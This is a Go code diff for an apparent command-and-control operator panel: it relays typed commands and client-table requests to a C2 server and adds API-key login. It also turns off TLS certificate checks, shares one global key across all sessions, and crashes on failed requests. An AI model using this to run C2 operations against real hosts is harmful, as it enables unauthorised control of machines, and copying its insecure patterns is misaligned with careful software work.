@@ -16,6 +16,9 @@ type cmdForm struct {
 	Cmd string `json:"cmd"`
 }
 
+var api_key string = ""
+var c2_address string = "https://localhost:443"
+
 func sendCommandToC2(c echo.Context) error {
 	cmdJson := cmdForm{}
 	fmt.Println(c.Request().Body)
@@ -36,8 +39,8 @@ func sendCommandToC2(c echo.Context) error {
 	fmt.Printf("\n")
 
 	fmt.Printf(cmdJson.Cmd)
-	url := "https://" + "localhost:443" + "/getCommand"
-	fmt.Printf(url)
+	link := "https://" + "localhost:443" + "/getCommand"
+	fmt.Printf(link)
 
 	body := fmt.Sprintf(`
 	{
@@ -46,15 +49,22 @@ func sendCommandToC2(c echo.Context) error {
 	}
 	`, cmdJson.ID, cmdJson.Cmd)
 	fmt.Printf(body)
+	r, err := http.NewRequest("POST", link, bytes.NewBufferString(body))
+	if err != nil {
+		panic(err)
+	}
+	r.Header.Add("Content-Type", "application/json")
+	r.Header.Set("auth-key", api_key)
 	tr := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 	}
 	client := &http.Client{Transport: tr}
 
-	response, err := client.Post(url, "application/json", bytes.NewBufferString(body))
+	response, err := client.Do(r)
 	if err != nil {
-		fmt.Println(err)
+		panic(err)
 	}
+
 	defer response.Body.Close()
 
 	content, _ := ioutil.ReadAll(response.Body)
@@ -82,10 +92,11 @@ func main() {
 
 	e.GET("/ready", func(c echo.Context) error {
 		link := "https://localhost:443/sendClientsTable"
-
 		client := &http.Client{Transport: tr}
+		req, _ := http.NewRequest("GET", link, nil)
+		req.Header.Set("auth-key", api_key)
+		response, err := client.Do(req)
 
-		response, err := client.Get(link)
 		if err != nil {
 			fmt.Println(err)
 		}
@@ -109,7 +120,9 @@ func main() {
 		fmt.Printf(uid)
 		client := &http.Client{Transport: tr}
 
-		response, err := client.Get(link)
+		req, _ := http.NewRequest("GET", link, nil)
+		req.Header.Set("auth-key", api_key)
+		response, err := client.Do(req)
 		if err != nil {
 			fmt.Println(err)
 		}
@@ -126,8 +139,22 @@ func main() {
 	})
 	e.POST("/login", func(c echo.Context) error {
 		//usr := c.FormValue("Username")
-		//key := c.FormValue("key")
-		return c.Redirect(http.StatusTemporaryRedirect, "/dashboard")
+		key := c.FormValue("Key")
+
+		api_key = key
+
+		tr := &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		}
+		client := &http.Client{Transport: tr}
+
+		req, _ := http.NewRequest("GET", c2_address+"/checkKey", nil)
+		req.Header.Set("auth-key", api_key)
+		res, _ := client.Do(req)
+		if res.StatusCode == 401 || res.StatusCode == 400 {
+			return c.String(http.StatusBadRequest, "Invalid key")
+		}
+		return c.Redirect(http.StatusMovedPermanently, "/dashboard")
 
 	})
 	e.POST("/sendCmd", sendCommandToC2)
